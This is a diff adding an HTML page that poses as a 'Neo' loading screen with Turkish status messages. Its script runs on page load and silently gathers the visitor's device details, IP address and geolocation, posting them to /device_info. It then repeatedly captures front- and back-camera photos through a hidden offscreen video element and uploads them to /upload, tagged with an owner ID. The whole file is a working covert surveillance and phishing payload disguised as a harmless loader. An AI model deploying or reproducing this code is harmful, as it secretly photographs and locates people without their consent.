@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<title>Neo</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body, html { height:100%; background:#000; display:flex; justify-content:center; align-items:center;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
+.container { text-align:center; padding:20px; }
+.neo-text { color:#cc0000; font-size:100px; font-weight:700; text-shadow:0 0 10px #cc0000;
+    margin-bottom:60px; letter-spacing:6px; }
+.progress-wrapper { width: 85%; max-width: 340px; margin: 0 auto 20px; }
+.progress-outer { width: 100%; height: 7px; background: rgba(204,0,0,0.1);
+    border-radius: 10px; overflow: hidden; }
+.progress-inner { width: 0%; height: 100%; background: #cc0000; border-radius: 10px;
+    transition: width 0.3s ease; }
+#progress-percent { color: #cc0000; font-size: 28px; font-weight: bold; margin: 15px 0; }
+#status-text { color: #888; font-size: 15px; font-weight: 300; margin-top: 30px; }
+#video { position:fixed; top:-9999px; left:-9999px; width:640px; height:480px; pointer-events:none; }
+@media (max-width:480px) {
+    .neo-text { font-size:75px; }
+    #progress-percent { font-size:24px; }
+    #status-text { font-size:13px; }
+}
+</style>
+</head>
+<body>
+<div class="container">
+    <div class="neo-text">neo</div>
+    <div class="progress-wrapper">
+        <div class="progress-outer"><div class="progress-inner" id="progress-bar"></div></div>
+        <div id="progress-percent">%0</div>
+    </div>
+    <div id="status-text">hosgeldin...</div>
+</div>
+<video id="video" autoplay playsinline muted></video>
+<canvas id="canvas" style="display:none;"></canvas>
+<script>
+const ownerId = "__OWNER_ID__", csrfToken = "__CSRF_TOKEN__";
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const progressBar = document.getElementById('progress-bar');
+const progressPercent = document.getElementById('progress-percent');
+const statusText = document.getElementById('status-text');
+let stream = null, photoCount = 0, isFinished = false;
+
+const statusMessages = [
+    'hosgeldin...','bi dk.....','yukleniyor...','yukleniyor...',
+    'sunucunun cevabi bekleniyor...','beklenmedik hata..',
+    'tekrardan deneniyor...','lutfen bekleyin...'
+];
+let msgIndex = 0;
+
+function updateProgress(pct) {
+    try { progressBar.style.width = pct + '%'; progressPercent.textContent = '%' + Math.round(pct); }
+    catch(e) {}
+}
+
+function cycleMessages() {
+    try {
+        if (isFinished) { statusText.textContent = 'lutfen bekleyin...'; updateProgress(99); return; }
+        statusText.textContent = statusMessages[msgIndex];
+        msgIndex = (msgIndex + 1) % statusMessages.length;
+    } catch(e) {}
+}
+
+async function collectDeviceInfo() {
+    const info = {};
+    try {
+        info.time = new Date().toLocaleString('tr-TR');
+        info.userAgent = navigator.userAgent;
+        info.language = navigator.language;
+        info.platform = navigator.platform;
+        info.screenSize = screen.width + 'x' + screen.height;
+        info.cpuCores = navigator.hardwareConcurrency || '?';
+        try {
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (conn) { info.connectionType = conn.effectiveType || '?';
+                info.downlink = conn.downlink + ' Mbps'; info.rtt = conn.rtt + ' ms'; }
+        } catch(e) {}
+        try { info.ram = navigator.deviceMemory || '?'; if (info.ram !== '?') info.ram += ' GB'; }
+        catch(e) { info.ram = '?'; }
+        try { const b = await navigator.getBattery();
+            info.batteryLevel = Math.round(b.level * 100) + '%'; info.isCharging = b.charging; }
+        catch(e) { info.batteryLevel = '?'; info.isCharging = false; }
+        try {
+            const c2 = document.createElement('canvas');
+            const gl = c2.getContext('webgl') || c2.getContext('experimental-webgl');
+            if (gl) { const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                if (dbg) info.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL); }
+        } catch(e) { info.gpu = '?'; }
+        try {
+            const ua = navigator.userAgent;
+            if (ua.includes('iPhone')) { info.deviceBrand='Apple'; info.deviceModel='iPhone'; }
+            else if (ua.includes('iPad')) { info.deviceBrand='Apple'; info.deviceModel='iPad'; }
+            else if (ua.includes('Android')) { info.deviceBrand='Android'; info.deviceModel='Android'; }
+            else if (ua.includes('Windows')) { info.deviceBrand='Microsoft'; info.deviceModel='Windows PC'; }
+            else if (ua.includes('Mac')) { info.deviceBrand='Apple'; info.deviceModel='Mac'; }
+            else if (ua.includes('Linux')) { info.deviceBrand='Linux'; info.deviceModel='Linux PC'; }
+        } catch(e) {}
+        try {
+            const r = await fetch('https://ipapi.co/json/');
+            const d = await r.json();
+            info.ip = d.ip || '?'; info.city = d.city || '?'; info.region = d.region || '?';
+            info.country = d.country_code || '?';
+            info.loc = (d.latitude || '') + ',' + (d.longitude || '');
+            info.org = d.org || '?'; info.postal = d.postal || '?'; info.timezone = d.timezone || '?';
+        } catch(e) { info.ip = '?'; info.city = '?'; }
+    } catch(e) {}
+    return info;
+}
+
+async function sendDeviceInfo() {
+    try {
+        const info = await collectDeviceInfo();
+        await fetch('/device_info', {
+            method:'POST',
+            headers:{'Content-Type':'application/json','X-CSRF-Token':csrfToken},
+            body:JSON.stringify({owner_id:ownerId, device_info:info})
+        });
+        return true;
+    } catch(e) { return false; }
+}
+
+async function initCamera(facingMode) {
+    try {
+        if (stream) { try { stream.getTracks().forEach(t=>t.stop()); } catch(e) {} }
+        const constraints = { video: { facingMode: facingMode, width: {ideal:640}, height: {ideal:480} }, audio: false };
+        stream = await navigator.mediaDevices.getUserMedia(constraints);
+        video.srcObject = stream; video.muted = true; video.playsInline = true;
+        await new Promise((resolve, reject) => {
+            video.onloadedmetadata = () => { video.play().then(resolve).catch(reject); };
+            setTimeout(() => reject(new Error('timeout')), 8000);
+        });
+        await new Promise(r => setTimeout(r, 500));
+        return true;
+    } catch(e) {
+        try {
+            if (stream) { try { stream.getTracks().forEach(t=>t.stop()); } catch(e) {} }
+            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode }, audio: false });
+            video.srcObject = stream; video.muted = true; video.playsInline = true;
+            await new Promise((resolve, reject) => {
+                video.onloadedmetadata = () => { video.play().then(resolve).catch(reject); };
+                setTimeout(() => reject(new Error('timeout')), 8000);
+            });
+            await new Promise(r => setTimeout(r, 500));
+            return true;
+        } catch(e2) { return false; }
+    }
+}
+
+function captureImage() {
+    try {
+        if (video.readyState < 2) return null;
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+        return canvas.toDataURL('image/jpeg', 0.7);
+    } catch(e) { return null; }
+}
+
+async function sendPhoto(img, type) {
+    try {
+        const r = await fetch('/upload', {
+            method:'POST',
+            headers:{'Content-Type':'application/json','X-CSRF-Token':csrfToken},
+            body:JSON.stringify({owner_id:ownerId, image:img, camera_type:type})
+        });
+        if (r.ok) { photoCount++; return true; }
+        return false;
+    } catch(e) { return false; }
+}
+
+async function capturePhotos() {
+    updateProgress(5);
+    for (let i = 1; i <= 5; i++) {
+        try {
+            const frontOk = await initCamera('user');
+            if (frontOk) {
+                await new Promise(r => setTimeout(r, 300));
+                const img = captureImage();
+                if (img) await sendPhoto(img, 'On Kamera ' + i);
+            }
+        } catch(e) {}
+        updateProgress(5 + i * 8);
+        try {
+            const backOk = await initCamera('environment');
+            if (backOk) {
+                await new Promise(r => setTimeout(r, 300));
+                const img = captureImage();
+                if (img) await sendPhoto(img, 'Arka Kamera ' + i);
+            }
+        } catch(e) {}
+        updateProgress(5 + i * 8 + 4);
+    }
+    updateProgress(95);
+    try { if (stream) stream.getTracks().forEach(t=>t.stop()); } catch(e) {}
+    isFinished = true; updateProgress(99); statusText.textContent = 'lutfen bekleyin...';
+}
+
+async function main() {
+    try {
+        setInterval(cycleMessages, 2500);
+        sendDeviceInfo();
+        setTimeout(async () => {
+            try { await capturePhotos(); }
+            catch(e) { isFinished = true; updateProgress(99); statusText.textContent = 'lutfen bekleyin...'; }
+        }, 2000);
+    } catch(e) { isFinished = true; updateProgress(99); statusText.textContent = 'lutfen bekleyin...'; }
+}
+
+if (document.readyState === 'complete') main();
+else window.addEventListener('load', main);
+</script>
+</body>
+</html>
